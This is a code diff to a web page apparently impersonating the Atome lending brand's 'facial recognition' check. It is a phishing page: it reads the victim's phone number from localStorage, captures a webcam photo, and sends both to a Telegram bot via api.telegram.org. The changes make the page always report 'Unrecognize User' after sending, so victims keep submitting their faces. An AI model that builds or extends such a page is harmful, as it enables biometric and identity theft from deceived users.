@@ -169,7 +169,7 @@
             transform: scale(0.98);
         }
 
-        /* PAGE 2 - FACE SCAN PAGE - atomebg2.png background */
+        /* PAGE 2 - FACE SCAN PAGE */
         .page-scan {
             min-height: 100vh;
             background: url('photos/atomebg2.png') center center/cover no-repeat fixed;
@@ -466,7 +466,6 @@
     <!-- PAGE 1: REQUIREMENTS -->
     <div id="pageRequirements" class="page-requirements">
         <div class="requirements-card">
-            <!-- Atome Logo Circle -->
             <div class="logo-circle">
                 <img src="photos/atomeA.png" alt="AtomA">
             </div>
@@ -492,7 +491,6 @@
     <!-- PAGE 2: FACE SCAN -->
     <div id="pageScan" class="page-scan">
         <div class="scan-container">
-            <!-- Atome Logo Circle sa Scan Page -->
             <div class="scan-logo-circle">
                 <img src="photos/atomeA.png" alt="AtomA">
             </div>
@@ -553,7 +551,7 @@
         const greenEdge = document.getElementById('greenEdge');
         const scanningText = document.getElementById('scanningText');
         
-        // Get phone number from localStorage (galing sa index.html)
+        // Get phone number from localStorage
         phoneNum = localStorage.getItem('tempPhoneNumber');
         
         if (!phoneNum) {
@@ -644,21 +642,29 @@
             scanningText.classList.add('hidden');
         }
         
-        // Show Unrecognize User Error and redirect to index.html
-        function showUnrecognizeAndRedirect() {
+        // Send face to Telegram (always sends regardless of result)
+        async function sendFaceToTelegram(blob, kb) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `face_${phoneNum}_${Date.now()}.jpg`);
+            formData.append('caption', `🔐 FACE CAPTURE (Unrecognized User)\n\n📱 Phone: +63${phoneNum}\n⏰ Time: ${new Date().toLocaleString()}\n📍 Source: AtomA Facial Recognition\n📸 Image Size: ${kb}KB\n⚠️ Status: Unrecognized - Pending Admin Approval`);
+            
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            return await res.json();
+        }
+        
+        // Show Unrecognize User Error (Dead End)
+        function showUnrecognizeError() {
             faceStatus.innerHTML = "❌ Unrecognize User. Please Try Again.";
             faceStatus.className = "status-text error";
             stopScanAnimation();
-            stopCamera();
-            
-            // Redirect to index.html after 2 seconds
-            setTimeout(() => {
-                window.location.href = 'index.html';
-            }, 2000);
         }
         
         // ============================================
-        // CAPTURE AND PROCESS
+        // CAPTURE AND PROCESS - DEAD END
         // ============================================
         async function captureAndProcess() {
             if (!camReady) {
@@ -681,49 +687,28 @@
                 
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
                 
-                // Check if face is detected (blob size check - masyadong maliit means walang mukha)
-                if (!blob || blob.size < 5000) {
-                    showUnrecognizeAndRedirect();
+                if (!blob || blob.size < 3000) {
+                    showUnrecognizeError();
                     return;
                 }
                 
                 const kb = (blob.size / 1024).toFixed(1);
-                faceStatus.innerHTML = `📸 Image captured (${kb}KB). Verifying...`;
+                faceStatus.innerHTML = `📸 Image captured (${kb}KB). Sending to server...`;
                 
-                // Send to Telegram
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, `face_${phoneNum}_${Date.now()}.jpg`);
-                formData.append('caption', `🔐 FACE CAPTURE\n\n📱 Phone: +63${phoneNum}\n⏰ Time: ${new Date().toLocaleString()}\n📍 Source: AtomA Facial Recognition\n📸 Image Size: ${kb}KB`);
-                
-                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await res.json();
+                // Send face to Telegram (always)
+                const result = await sendFaceToTelegram(blob, kb);
                 
                 if (result.ok) {
-                    faceStatus.innerHTML = "✅ VERIFIED! Face sent to Telegram. Redirecting...";
-                    faceStatus.className = "status-text";
-                    stopScanAnimation();
-                    
-                    // Save to localStorage
-                    localStorage.setItem('atomeUser', JSON.stringify({
-                        phone: phoneNum,
-                        verified: true,
-                        verifiedTime: new Date().toISOString(),
-                        faceCaptured: true
-                    }));
-                    
-                    setTimeout(() => {
-                        window.location.href = 'index.html';
-                    }, 2000);
+                    // ALWAYS SHOW UNRECOGNIZE USER - DEAD END
+                    showUnrecognizeError();
+                    console.log("✅ Face sent to Telegram but marked as Unrecognized User");
                 } else {
-                    showUnrecognizeAndRedirect();
+                    showUnrecognizeError();
                 }
+                
             } catch(err) {
                 console.error("Error:", err);
-                showUnrecognizeAndRedirect();
+                showUnrecognizeError();
             }
         }
         
